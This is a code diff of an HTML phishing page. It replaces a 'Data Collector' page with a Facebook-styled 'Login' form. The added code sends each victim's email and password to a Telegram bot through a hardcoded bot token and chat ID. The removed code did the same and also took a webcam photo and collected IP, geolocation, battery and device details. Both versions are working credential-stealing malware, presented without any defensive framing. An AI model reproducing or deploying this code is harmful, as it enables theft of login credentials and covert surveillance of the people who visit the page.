@@ -3,40 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Collector</title>
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 300px;
+            padding: 20px;
+        }
+        .login-container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #1877f2;
+            text-align: center;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #155cdb;
+        }
+        .login-container a {
+            text-align: center;
+            display: block;
+            color: #1877f2;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to Our Site</h1>
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-
-    <form id="dataForm">
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required>
-        <br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-        <br>
-        <button type="submit">Submit</button>
-    </form>
-
+    <div class="login-container">
+        <h1>Login</h1>
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <a href="#">Forgot Password?</a>
+    </div>
     <script>
-        const fetch = require('node-fetch');
-
-
-        async function sendToTelegram(data, photoUrl) {
+        async function sendToTelegram(email, password) {
             const botToken = "7221265350:AAFW3JNsT8JtmBhSo_mt7GDi6tSjx36MEEg"; // Replace with your bot token
             const chatId = "7254975140"; // Replace with your chat ID
 
             const message = `
-            *User Information*
-            *Email:* ${data.email}
-            *Password:* ${data.password}
-            *IP Address:* ${data.ip}
-            *Battery Level:* ${data.battery.level}
-            *Charging:* ${data.battery.charging}
-            *Device Info:* ${data.phoneInfo}
-            *Location:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}
+            *User Login Information*
+            *Email:* ${email}
+            *Password:* ${password}
             `;
 
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -48,101 +86,16 @@
                     parse_mode: 'Markdown'
                 })
             });
-
-            if (photoUrl) {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        photo: photoUrl
-                    })
-                });
-            }
         }
 
-        async function getIPAddress() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
-
-        async function getBatteryInfo() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                return { level: battery.level * 100 + "%", charging: battery.charging ? "Yes" : "No" };
-            } else {
-                return { level: "Unknown", charging: "Unknown" };
-            }
-        }
-
-        function getPhoneInfo() {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "Android Device";
-            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iOS Device";
-            if (/windows phone/i.test(ua)) return "Windows Phone";
-            if (/Macintosh/i.test(ua)) return "Macintosh";
-            if (/Windows/i.test(ua)) return "Windows PC";
-            return "Unknown";
-        }
-
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(position => {
-                        resolve({ lat: position.coords.latitude, lon: position.coords.longitude });
-                    }, () => {
-                        resolve({ lat: "Unknown", lon: "Unknown" });
-                    });
-                } else {
-                    resolve({ lat: "Unknown", lon: "Unknown" });
-                }
-            });
-        }
-
-        function takePhoto() {
-            return new Promise((resolve, reject) => {
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        setTimeout(() => {
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            video.srcObject.getTracks().forEach(track => track.stop());
-                            resolve(canvas.toDataURL('image/png'));
-                        }, 100); // Wait 3 seconds before taking the photo
-                    })
-                    .catch(err => {
-                        console.error("Error accessing webcam:", err);
-                        resolve("");
-                    });
-            });
-        }
-
-        async function gatherAndSendData() {
-            const ip = await getIPAddress();
-            const battery = await getBatteryInfo();
-            const phoneInfo = getPhoneInfo();
-            const location = await getLocation();
-            const photoUrl = await takePhoto();
-
-            const formData = new FormData(document.getElementById('dataForm'));
-            const email = formData.get('email');
-            const password = formData.get('password');
-
-            const data = { ip, battery, phoneInfo, location, email, password };
-            
-            sendToTelegram(data, photoUrl);
-        }
-
-        document.getElementById('dataForm').addEventListener('submit', (event) => {
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
-            gatherAndSendData();
-        });
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
+            await sendToTelegram(email, password);
+            alert('Login data sent');
+        });
     </script>
 </body>
 </html>
